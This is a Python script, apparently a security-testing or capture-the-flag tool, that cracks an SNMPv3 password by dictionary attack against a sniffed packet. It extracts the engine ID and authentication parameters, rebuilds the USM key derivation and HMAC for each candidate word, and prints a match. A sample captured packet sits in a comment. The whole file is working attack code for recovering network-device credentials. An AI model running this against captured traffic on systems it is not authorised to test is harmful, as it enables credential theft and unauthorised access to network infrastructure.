import hashlib
import argparse

parser = argparse.ArgumentParser(description='Crack a SMNP password with sniffed packet')
parser.add_argument('--hash', dest='hash_function', default='md5', choices=['sha1', 'md5'], help='hashing function md5|sh1 (default md5)')
parser.add_argument('--msg', dest='wholemsg', help='the whole message received')
parser.add_argument('--dict', dest='dict', help='list of word to brutforce')
args = parser.parse_args()

print(args.hash_function)
print(args.wholemsg)
print(args.dict)

# 3081800201033011020420dd06a9020300ffe30401050201030431302f041180001f8880e9bd0c1d12667a5100000000020105020120040475736572040ccfdc4525f88882a4ac0a366a04003035041180001f8880e9bd0c1d12667a51000000000400a01e02046b4c5ac40201000201003010300e060a2b06010201041e0105010500
whole_message = bytes.fromhex(args.wholemsg)
if args.hash_function == 'md5':
    hash_function = hashlib.md5
else:
    hash_function = hashlib.sha1

msgAuthoritativeEngineID_index = whole_message.index(b'\x04\x11') + 2
msgAuthoritativeEngineID = whole_message[msgAuthoritativeEngineID_index:msgAuthoritativeEngineID_index + 17]

msgAuthenticationParameters_index = whole_message.index(b'\x04\x0c') + 2
msgAuthenticationParameters = whole_message[msgAuthenticationParameters_index:msgAuthenticationParameters_index + 12]

whole_message = whole_message[:msgAuthenticationParameters_index] + 12*b'\x00' + whole_message[msgAuthenticationParameters_index + 12:]

with open(args.dict, 'r') as f:
    candidates = f.read().split('\n')

def hash(b):
    result = hash_function(b)
    return result.digest()

def byte_xor(ba1, ba2):
    result = b''
    for i in range(len(ba1)):
        result += bytes([ba1[i] ^ ba2[i]])
    return result


for i, candidate in enumerate(candidates):
    if len(candidate) == 0:
        continue

    secret_key = candidate.encode()
    secret_key = secret_key * ((1048576 // len(secret_key)) + 1)
    secret_key = secret_key[:1048576]
    string1 = hash(secret_key)

    string2 = string1 + msgAuthoritativeEngineID + string1
    authkey = hash(string2)

    extendedAuthKey = authkey + 48*b'\x00'

    opad = 64*b'\x5c'
    ipad = 64*b'\x36'

    k1 = byte_xor(ipad, extendedAuthKey)
    k2 = byte_xor(opad, extendedAuthKey)

    extk1 = k1 + whole_message
    hashk1 = hash(extk1)

    extk2 = k2 + hashk1
    hashk2 = hash(extk2)

    msgAuthenticationParameters_candidate = hashk2[:12]
    print("\rTested : {:.2f}%".format(i/len(candidates)), end="")
    if msgAuthenticationParameters_candidate == msgAuthenticationParameters:
        print("\nPassword found : {}".format(candidate))
        break
